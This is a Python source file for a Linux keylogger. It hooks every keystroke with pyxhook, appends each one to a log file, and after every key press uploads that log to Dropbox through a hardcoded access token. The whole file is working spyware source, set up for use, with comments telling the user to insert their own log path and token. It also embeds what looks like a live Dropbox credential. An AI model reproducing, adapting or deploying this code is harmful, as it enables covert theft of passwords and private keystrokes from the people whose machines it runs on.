#!/usr/bin/python
"""
A simple keylogger witten in python for linux platform
All keystrokes are recorded in a log file.

The program terminates when grave key(`) is pressed

grave key is found below Esc key
"""

import pyxhook
import dropbox

#change this to your log file's path
logFile = "/root/Desktop/NextKey/Keys.txt"
#change this to your access token
dropboxUser = "KQykcRlSRiEAAAAAAAADz6wu1jiTy_Y-wgFLF9L3uuqZmz3Baf9kkMF3k2h9dZh7"

#this function is called everytime a key is pressed.
def OnKeyPress(event):
  fob = open(logFile,"a+b")

  if event.Key == "Return":
    fob.write("\n")
  elif event.Key == "BackSpace":
    fob.seek(0,2)
    size = fob.tell()
    fob.truncate(size - 1)
    fob.write(" {Delete} ")
  elif event.Ascii == 32:
    fob.write(" ")
  elif event.Key == "comma":
    fob.write(",")
  elif event.Key == "period":
    fob.write(".")
  elif event.Key == "ntilde":
    fob.write("\xc3\xb1")
  elif event.Key == "question":
    fob.write("?")
  elif event.Key == "exclamdown":
    fob.write("\xc2\xbf")
  elif event.Key == "Shift_R" or event.Key == "Shift_L":
    fob.write("{Shift}")
  elif event.Key == "Alt_R" or event.Key == "Alt_L":
    fob.write("{Alt}")  
  elif event.Key == "exclam":
    fob.write("!")
  elif event.Key == "minus":
    fob.write("-")
  elif event.Key == "underscore":
    fob.write("_")
  elif event.Key == "colon":
    fob.write(":")
  elif event.Key == "semicolon":
    fob.write(";")
  elif event.Key == "apostrophe":
    fob.write("'")
  elif event.Key == "equal":
    fob.write("=")
  elif event.Key == "quotedbl":
    fob.write('"')
  elif event.Key == "dollar":
    fob.write("$")
  elif event.Key == "percent":
    fob.write("%")
  elif event.Key == "ampersand":
    fob.write("&")
  elif event.Key == "slash":
    fob.write("/")
  elif event.Key == "parenleft":
    fob.write("(")
  elif event.Key == "parenright":
    fob.write(")")
  elif event.Key == "ccedilla":
    fob.write("\xc3\xa7")
  elif event.Ascii == 60:
    fob.write("<")
  elif event.Ascii == 62:
    fob.write(">")
  elif event.Ascii <= 47 or event.Ascii >= 123:
    fob.write('{' + event.Key + '} ')
  else:
    fob.write(event.Key)
  fob.close()

  #Upload file to DropBox
  client = dropbox.client.DropboxClient(dropboxUser)
  file = open(logFile, "rb")
  response = client.put_file("Keys.txt", file, overwrite = True)

#instantiate HookManager class
new_hook=pyxhook.HookManager()
#listen to all keystrokes
new_hook.KeyDown = OnKeyPress
#hook the keyboard
new_hook.HookKeyboard()
#start the session
new_hook.start()
